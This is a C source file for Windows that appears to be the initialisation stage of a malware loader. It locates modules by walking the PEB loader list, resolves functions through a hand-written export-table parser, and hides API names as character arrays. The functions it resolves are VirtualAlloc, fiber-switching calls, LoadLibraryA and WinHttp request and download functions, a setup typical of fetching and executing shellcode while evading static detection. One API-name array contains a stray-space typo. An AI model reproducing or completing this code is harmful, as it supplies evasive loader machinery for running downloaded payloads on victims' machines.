#include <windows.h>
#include <common.h>
#include <structs.h>
#include <core/win32.h>

PVOID LdrModuleAddr( _In_ LPWSTR ModuleName){

    PTEB                  pTeb  = __readgsqword(0x30);
    PLDR_DATA_TABLE_ENTRY Data  = { 0 };
    PLIST_ENTRY           Head  = { 0 };
    PLIST_ENTRY           Entry = { 0 };

    Head  = &pTeb->ProcessEnvironmentBlock->Ldr->InLoadOrderModuleList;
    Entry = Head->Flink;

    for ( ; Head != Entry ; Entry = Entry->Flink ) {
        Data = C_PTR( Entry );
        if (wccmp(Data->BaseDllName.Buffer, ModuleName) == 0){
            return C_PTR(Data->DllBase);
        }
    }

    return NULL;
}

PVOID LdrFuncAddr( _In_ PVOID BaseModule, _In_ PCHAR FuncName){
    
    PIMAGE_NT_HEADERS       pImgNt           = { 0 };
    PIMAGE_EXPORT_DIRECTORY ExpDir           = { 0 };
    DWORD                   ExpDirSz         = { 0 };
    PDWORD                  AddrOfFuncs      = { 0 };
    PDWORD                  AddrOfNames      = { 0 };
    PWORD                   AddrOfOrdinals   = { 0 };
    PVOID                   FuncAddr         = { 0 };

    pImgNt           = C_PTR( BaseModule + ((PIMAGE_DOS_HEADER)BaseModule)->e_lfanew);
    ExpDir           = C_PTR( BaseModule + pImgNt->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ].VirtualAddress );
    ExpDirSz         = U_PTR( BaseModule + pImgNt->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ].Size );

    AddrOfNames      = C_PTR( BaseModule + ExpDir->AddressOfNames );
    AddrOfFuncs      = C_PTR( BaseModule + ExpDir->AddressOfFunctions );
    AddrOfOrdinals   = C_PTR( BaseModule + ExpDir->AddressOfNameOrdinals );

    for ( int i = 0; i < ExpDir->NumberOfNames; i++ ){    
      if ( StringCompareA( (PCHAR)BaseModule + AddrOfNames[ i ], FuncName ) == 0 ) {
        return C_PTR( BaseModule + AddrOfFuncs[ AddrOfOrdinals[ i ] ] );
      }
    }

    return NULL;
}

void InitInstance( _Out_ PINSTANCE pInstance){
  /*--------------------------[ Ntdll ]--------------------------*/

  WCHAR  wNtdll[]           = L"ntdll.dll";

  CHAR cRtlAllocateHeap[]   = { 'R', 't', 'l', 'A', 'l', 'l', 'o', 'c', 'a', 't', 'e', 'H', 'e', 'a', 'p', 0 };
  CHAR cRtlReAllocateHeap[] = { 'R', 't', 'l', 'R', 'e', 'A', 'l', 'l', 'o', 'c', 'a', 't', 'e', 'H', 'e', 'a', 'p', 0 };
  CHAR cRtlFreeHeap[]       = { 'R', 't', 'l', 'F', 'r', 'e', 'e', 'H', 'e ', 'a', 'p', 0 };

  pInstance->Modules.Ntdll          = LdrModuleAddr(wNtdll);

  pInstance->Api.pRtlAllocateHeap   = LdrFuncAddr(pInstance->Modules.Ntdll, cRtlAllocateHeap);
  pInstance->Api.pRtlReAllocateHeap = LdrFuncAddr(pInstance->Modules.Ntdll, cRtlReAllocateHeap);
  pInstance->Api.pRtlFreeHeap       = LdrFuncAddr(pInstance->Modules.Ntdll, cRtlFreeHeap);


  /*--------------------------[ Kernel32 ]--------------------------*/

  WCHAR wKernel32[] = L"KERNEL32.DLL";

  CHAR  cVirtualAlloc[]           = { 'V', 'i', 'r', 't', 'u', 'a','l', 'A', 'l', 'l', 'o', 'c', 0 };
  CHAR  cCreateFiber[]            = { 'C', 'r', 'e', 'a', 't', 'e', 'F', 'i', 'b', 'e', 'r', 0 };
  CHAR  cConvertThreadToFiber[]   = { 'C', 'o', 'n', 'v', 'e', 'r', 't', 'T', 'h', 'r', 'e', 'a', 'd', 'T', 'o', 'F', 'i', 'b', 'e', 'r', 0 };
  CHAR  cSwitchToFiber[]          = { 'S', 'w', 'i', 't', 'c', 'h', 'T', 'o', 'F', 'i', 'b', 'e', 'r', 0 };
  CHAR  cLoadLibraryA[]           = { 'L', 'o', 'a', 'd', 'L', 'i', 'b', 'r', 'a', 'r', 'y', 'A', 0 };

  pInstance->Modules.Kernel32           = LdrModuleAddr(wKernel32);

  pInstance->Api.pVirtualAlloc          = LdrFuncAddr(pInstance->Modules.Kernel32, cVirtualAlloc);
  pInstance->Api.pCreateFiber           = LdrFuncAddr(pInstance->Modules.Kernel32, cCreateFiber);
  pInstance->Api.pConvertThreadToFiber  = LdrFuncAddr(pInstance->Modules.Kernel32, cConvertThreadToFiber);
  pInstance->Api.pSwitchToFiber         = LdrFuncAddr(pInstance->Modules.Kernel32, cSwitchToFiber);
  pInstance->Api.pLoadLibraryA          = LdrFuncAddr(pInstance->Modules.Kernel32, cLoadLibraryA);
  /*--------------------------[ WinHttp ]--------------------------*/

  CHAR cWinHttp[] = { 'W', 'i', 'n', 'H', 't', 't', 'p', '.', 'd', 'l', 'l', 0};

  CHAR cWinHttpOpen[]            = { 'W', 'i', 'n', 'H', 't', 't', 'p', 'O', 'p', 'e', 'n', 0 };
  CHAR cWinHttpConnect[]         = { 'W', 'i', 'n', 'H', 't', 't', 'p', 'C', 'o', 'n', 'n', 'e', 'c', 't', 0 };
  CHAR cWinHttpOpenRequest[]     = { 'W', 'i', 'n', 'H', 't', 't', 'p', 'O', 'p', 'e', 'n', 'R', 'e', 'q', 'u', 'e', 's', 't', 0 };
  CHAR cWinHttpReadData[]        = { 'W', 'i', 'n', 'H', 't', 't', 'p', 'R', 'e', 'a', 'd', 'D', 'a', 't', 'a', 0 };
  CHAR cWinHttpReceiveResponse[] = { 'W', 'i', 'n', 'H', 't', 't', 'p', 'R', 'e', 'c', 'e', 'i', 'v', 'e', 'R', 'e', 's', 'p', 'o', 'n', 's', 'e', 0 };
  CHAR cWinHttpSendRequest[]     = { 'W', 'i', 'n', 'H', 't', 't', 'p', 'S', 'e', 'n', 'd', 'R', 'e', 'q', 'u', 'e', 's', 't', 0 };
  CHAR cWinHttpQueryHeaders[]    = { 'W', 'i', 'n', 'H', 't', 't', 'p', 'Q', 'u', 'e', 'r', 'y', 'H', 'e', 'a', 'd', 'e', 'r', 's', 0 };
  CHAR cWinHttpCloseHandle[]     = { 'W', 'i', 'n', 'H', 't', 't', 'p', 'C', 'l', 'o', 's', 'e', 'H', 'a', 'n', 'd', 'l', 'e', 0 };

  pInstance->Modules.WinHttp   = pInstance->Api.pLoadLibraryA(cWinHttp);

  pInstance->Api.pWinHttpOpen            = LdrFuncAddr(pInstance->Modules.WinHttp, cWinHttpOpen);
  pInstance->Api.pWinHttpConnect         = LdrFuncAddr(pInstance->Modules.WinHttp, cWinHttpConnect);
  pInstance->Api.pWinHttpOpenRequest     = LdrFuncAddr(pInstance->Modules.WinHttp, cWinHttpOpenRequest);
  pInstance->Api.pWinHttpReadData        = LdrFuncAddr(pInstance->Modules.WinHttp, cWinHttpReadData);
  pInstance->Api.pWinHttpReceiveResponse = LdrFuncAddr(pInstance->Modules.WinHttp, cWinHttpReceiveResponse);
  pInstance->Api.pWinHttpSendRequest     = LdrFuncAddr(pInstance->Modules.WinHttp, cWinHttpSendRequest);
  pInstance->Api.pWinHttpQueryHeaders    = LdrFuncAddr(pInstance->Modules.WinHttp, cWinHttpQueryHeaders);
  pInstance->Api.pWinHttpCloseHandle     = LdrFuncAddr(pInstance->Modules.WinHttp, cWinHttpCloseHandle);

}